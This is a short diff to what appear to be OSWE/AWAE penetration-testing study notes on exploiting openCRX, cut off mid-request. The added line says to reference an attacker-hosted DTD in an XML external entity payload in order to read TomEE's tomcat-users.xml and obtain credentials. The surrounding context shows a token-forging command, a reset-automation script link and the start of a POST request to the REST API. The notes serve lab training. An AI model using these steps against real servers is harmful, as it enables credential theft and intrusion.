@@ -228,6 +228,7 @@ Then run it: `java OpenCRXToken <start_timestamp> <stop_timestamp> > tokens.txt`
 ### Automating Resets
 Script: https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/xxe_lfd.py#L20C21-L20C21
 ## XML External Entity Vulnerability
+Now we can update our payload to reference this DTD file on our Kali instance. Since the application is running on TomEE, let's see if we can can get TomEE user credentials by targeting the `tomcat-users.xml` file.
 ```
 POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
 Host: opencrx:8080
